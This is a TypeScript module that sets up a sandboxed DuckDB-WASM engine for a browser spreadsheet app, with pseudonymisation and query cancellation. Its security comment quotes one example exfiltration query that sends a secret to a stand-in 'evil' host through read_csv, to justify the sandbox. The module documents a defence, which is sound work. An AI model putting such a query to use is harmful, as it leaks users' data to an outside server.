import * as duckdb from '@duckdb/duckdb-wasm'
import { Schema, Table, type RecordBatch } from 'apache-arrow'
import { CLEAN_MACROS } from './clean'
// Self-hosted engine: Vite emits these as static assets, so nothing loads from a CDN.
// Only the "eh" (wasm exceptions) build is shipped; every current browser supports it.
import ehModuleUrl from '@duckdb/duckdb-wasm/dist/duckdb-eh.wasm?url'
import ehWorkerUrl from '@duckdb/duckdb-wasm/dist/duckdb-browser-eh.worker.js?url'

export interface Engine {
  db: duckdb.AsyncDuckDB
  /** For the app's own reads (grid windows, stats, profiles, charts, metadata). Never used with send(). */
  conn: duckdb.AsyncDuckDBConnection
  /**
   * Runs user SQL and file loads with send(), so they can be cancelled. It has its own connection because
   * DuckDB-WASM abandons a connection's pending send() if another query arrives on that same connection
   * (the grid scrolling, a background snapshot…). Use it only inside withRunLock().
   */
  runConn: duckdb.AsyncDuckDBConnection
  /** Extensions that loaded from this site before the sandbox was sealed. */
  extensions: { parquet: boolean; json: boolean }
  /** True once SQL can no longer reach the network or anything outside SANDBOX_DIR. */
  sealed: boolean
}

/** Every file Sheetah hands to DuckDB (opened files, sheets, exports) lives under this virtual folder. */
export const SANDBOX_DIR = '/sheetah/'

/** Builds a safe virtual path inside the sandbox folder for a user-supplied name. */
export const sandboxPath = (name: string) =>
  // Lower-cased: DuckDB detects compression from the extension, and ".CSV.GZ" wouldn't match.
  `${SANDBOX_DIR}${name.replace(/[^A-Za-z0-9._-]+/g, '_').replace(/\.{2,}/g, '_').replace(/\.[A-Za-z0-9.]+$/, (ext) => ext.toLowerCase())}`

/** Results live in their own schema, so they never show up as the user's tables and are shared by both connections. */
export const RESULTS_SCHEMA = '__sheetah'

let enginePromise: Promise<Engine> | null = null

/*
 * Security model: user SQL is untrusted (people paste queries from the internet). DuckDB can read
 * URLs, so a query could otherwise leak data in a request like read_csv('https://evil/?d=' || secret).
 * Before the engine is handed to the app we:
 *   1. load the extensions we need from this site (no remote fallback),
 *   2. allow file access only under SANDBOX_DIR and switch off all other external access,
 *   3. lock the configuration so SQL can't switch any of it back on.
 * The page's Content-Security-Policy (vercel.json) blocks other origins as a second, independent layer.
 */
export function getEngine(): Promise<Engine> {
  enginePromise ??= (async () => {
    const worker = new Worker(ehWorkerUrl)
    const db = new duckdb.AsyncDuckDB(new duckdb.VoidLogger(), worker)
    await db.instantiate(ehModuleUrl)
    // Keep BIGINT as BigInt in Arrow results (exact values; needed for lossless table snapshots).
    await db.open({ query: { castBigIntToDouble: false, castTimestampToDate: false } })
    const conn = await db.connect()
    await conn.query(`SET autoinstall_known_extensions = false; SET autoload_known_extensions = false;`)
    await conn.query(`CREATE SCHEMA IF NOT EXISTS ${RESULTS_SCHEMA}`)

    const repo = new URL(`${import.meta.env.BASE_URL}duckdb-extensions`, location.href).href.replace(/\/$/, '')
    const load = async (name: 'parquet' | 'json') => {
      try {
        await conn.query(`INSTALL ${name} FROM '${repo}'`)
        await conn.query(`LOAD ${name}`)
        return true
      } catch {
        return false // not bundled in this build (e.g. dev server); the UI explains when it's needed
      }
    }
    const [parquet, json] = await Promise.all([load('parquet'), load('json')])

    await conn.query(`SET allowed_directories = ['${SANDBOX_DIR}']`)
    await conn.query(`SET enable_external_access = false`)
    await conn.query(`SET lock_configuration = true`)
    // Opened after sealing: the settings above are global, so this connection is sealed too.
    const runConn = await db.connect()
    // pseudonym(v): a keyed hash for "Anonymize". Macros and variables belong to a connection.
    sessionKey = pseudonymKey()
    for (const c of [conn, runConn]) await definePseudonym(c, sessionKey)
    // number_from_text(), date_from_text()…: what clean-up steps write, so their SQL stays readable.
    for (const c of [conn, runConn]) for (const m of CLEAN_MACROS) await c.query(m)

    return { db, conn, runConn, extensions: { parquet, json }, sealed: true }
  })()
  return enginePromise
}

/* --------------------------------- Pseudonyms ---------------------------------- */

const KEY_STORE = 'sheetah:pseudonym-key'
let sessionKey = ''

/**
 * The secret behind pseudonym(): random per session, or kept in this browser if the user asks for
 * stable pseudonyms across visits. It is never written into SQL, links or exports, which makes
 * guessing much harder than with a plain hash (phone numbers and IDs are few enough to try them all).
 * It is pseudonymisation, not anonymity: anyone with this browser's key can recompute the pseudonyms.
 */
function pseudonymKey(): string {
  try {
    const kept = localStorage.getItem(KEY_STORE)
    if (kept && /^[0-9a-f]{64}$/.test(kept)) return kept
  } catch {
    /* storage blocked */
  }
  return Array.from(crypto.getRandomValues(new Uint8Array(32)), (b) => b.toString(16).padStart(2, '0')).join('')
}

async function definePseudonym(c: duckdb.AsyncDuckDBConnection, key: string) {
  await c.query(`SET VARIABLE sheetah_key = '${key}'`)
  await c.query(
    `CREATE OR REPLACE TEMP MACRO pseudonym(v) AS CASE WHEN v IS NULL THEN NULL ELSE left(sha256(getvariable('sheetah_key') || lower(trim(v::VARCHAR))), 12) END`,
  )
}

export function keepsPseudonymKey(): boolean {
  try {
    return !!localStorage.getItem(KEY_STORE)
  } catch {
    return false
  }
}

/** Keep (or forget) this session's pseudonym key in this browser, so pseudonyms match next time. */
export async function keepPseudonymKey(keep: boolean): Promise<void> {
  await getEngine()
  try {
    if (keep) localStorage.setItem(KEY_STORE, sessionKey)
    else localStorage.removeItem(KEY_STORE)
  } catch {
    /* storage blocked: pseudonyms stay per session */
  }
}

/** Puts back pseudonym() and its key on runConn (call inside the run lock), in case a script replaced them. */
export async function restorePseudonym(): Promise<void> {
  const { runConn } = await getEngine()
  await definePseudonym(runConn, sessionKey)
}

/** Throws a friendly error if a format's extension isn't available in this build. */
export async function ensureExtension(name: 'parquet' | 'json'): Promise<void> {
  const { extensions } = await getEngine()
  if (extensions[name]) return
  throw new Error(
    `${name === 'parquet' ? 'Parquet' : 'JSON'} support isn’t included in this build. Sheetah only runs code served from its own site, so it won’t fetch it from elsewhere. CSV and Excel files work.`,
  )
}

export { isReserved, quoteIdent, quoteLiteral, sqlName } from './sql'

/** Rows of a small query as plain objects (for metadata, stats, aggregates). */
export async function queryObjects<T = Record<string, unknown>>(sql: string): Promise<T[]> {
  const { conn } = await getEngine()
  const table = await conn.query(sql)
  return table.toArray().map((row) => row.toJSON() as T)
}


/* ------------------------------- Cancellable work -------------------------------- */

export class CancelledError extends Error {
  constructor() {
    super('Query cancelled.')
  }
}
export const isCancel = (e: unknown) => e instanceof CancelledError || /query was cancel|interrupted/i.test(e instanceof Error ? e.message : String(e))

let runTail: Promise<unknown> = Promise.resolve()

/** What holds runConn right now, so a cancel only stops the kind of work it was meant for. */
export type RunKind = 'query' | 'load'
let holder: RunKind | null = null

/** Serialises everything that uses runConn: user queries and file loads run one at a time. */
export function withRunLock<T>(fn: () => Promise<T>, kind: RunKind = 'load'): Promise<T> {
  const run = async () => {
    holder = kind
    try {
      return await fn()
    } finally {
      holder = null
    }
  }
  const next = runTail.then(run, run)
  runTail = next.catch(() => {})
  return next
}

/**
 * send() reports errors as JSON ({"exception_type":"Parser","exception_message":"…"}), query() as
 * "Parser Error: …". Normalise to the readable form so messages and error checks are the same everywhere.
 */
export function normaliseError(e: unknown): Error {
  const err = e instanceof Error ? e : new Error(String(e))
  const text = err.message.trim()
  if (text.startsWith('{')) {
    try {
      const j = JSON.parse(text) as { exception_type?: string; exception_message?: string }
      if (j.exception_message) err.message = `${j.exception_type ?? 'Database'} Error: ${j.exception_message}`
    } catch {
      /* not JSON after all */
    }
  }
  return err
}

/** Runs one statement on runConn with send(), so cancelRunning() can interrupt it. Returns its rows. */
export async function sendAll(sql: string): Promise<Table> {
  const { runConn } = await getEngine()
  try {
    const reader = await runConn.send(sql)
    const batches: RecordBatch[] = []
    for await (const batch of reader) batches.push(batch)
    return batches.length ? new Table(batches) : new Table(reader.schema ?? new Schema([]))
  } catch (e) {
    const err = normaliseError(e)
    if (isCancel(err)) throw new CancelledError()
    throw err
  }
}

/**
 * Interrupts what runConn is doing, if it's that kind of work: starting a new query stops the previous
 * query but never a file that is still loading.
 */
export async function cancelRunning(kind?: RunKind): Promise<boolean> {
  if (!holder || (kind && holder !== kind)) return false
  const { runConn } = await getEngine()
  return runConn.cancelSent()
}
